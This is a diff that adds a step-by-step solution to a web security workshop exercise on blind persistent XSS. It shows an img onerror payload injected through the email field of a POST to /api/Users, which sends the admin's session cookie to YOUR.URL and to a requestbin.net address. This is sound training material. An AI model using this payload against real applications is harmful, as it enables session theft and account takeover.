@@ -542,6 +542,51 @@ Have you tried the following?
 <img src=x onerror="this.src='YOUR.URL?'+document.cookie; this.removeAttribute('onerror');">
 ```
 </details>
+<details>
+  <summary>📚 Solution</summary>
+
+1. When we login as admin and visit `/#/administration`, we see that the email
+   of the registered users is displayed. The email can be set during
+   registration. Let's try creating an account with some html tags as email
+   address. If you try doing it via the UI it won't work as there is a
+   client-side verification.
+2. By inspecting the traffic, we learn that a POST request to `/api/Users` is
+   performed. We observe that the email field is not verified server side and we
+   can send any input (note, it is not clear at this point if inserted html tags
+   aren't escaped in the admin interface).
+3. Since we want to exfiltrate the cookie of the admin, we build a payload that
+   fits this purpose. The following payload sends the cookie to YOUR.URL. 
+
+```
+<img src=x onerror="this.src='YOUR.URL?'+document.cookie; this.removeAttribute('onerror');">
+```
+
+For our PoC, we can use requestbin.net. Now, we send the following POST request
+to `/api/Users`:
+
+```json
+{
+    "email": "<img src=x onerror=\"this.src='https://requestbin.net/r/cbn65oyv?inspect?'+document.cookie; this.removeAttribute('onerror');\">",
+    "password": "password",
+    "passwordRepeat": "password",
+    "securityQuestion": {
+        "id": 2,
+        "question": "Mother's maiden name?",
+        "createdAt": "2022-04-25T21:18:01.837Z",
+        "updatedAt": "2022-04-25T21:18:01.837Z"
+    },
+    "securityAnswer": "23"
+}
+```
+
+4. At this point, we can login as admin and visit `/#/administration`.
+5. The requestbin (or you server) will receive the request with the session
+   cookie, i.e., you successfully exfiltrated the session cookie.
+
+
+<img src="https://github.com/Zuehlke/WebSecurityWorkshop/blob/solutions/solutions/screenshots/blind-persistent-xss-sol1.png?raw=true" alt="Screenshot that shows exfiltrated cookie"/>
+
+</details>
 
 
 ## Content Security Policy
